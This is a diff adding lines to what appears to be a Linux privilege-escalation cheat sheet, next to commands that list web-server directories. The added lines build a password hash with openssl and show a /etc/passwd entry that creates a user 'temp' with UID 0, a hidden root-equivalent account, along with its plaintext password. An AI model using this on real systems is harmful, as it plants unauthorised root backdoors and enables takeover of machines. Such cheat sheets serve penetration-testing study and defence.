@@ -1322,6 +1322,13 @@ ls -alhR /var/www/ 2>/dev/null
 ls -alhR /srv/www/htdocs/ 2>/dev/null
 ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/ 2>/dev/null
+
+# Creating entry for /etc/passwd
+openssl passwd -1 -salt ignite pass123
+
+temp:{RESULT}:0:0:root:/root:/bin/bash
+
+temp:pass123
 ```
 <br />
 
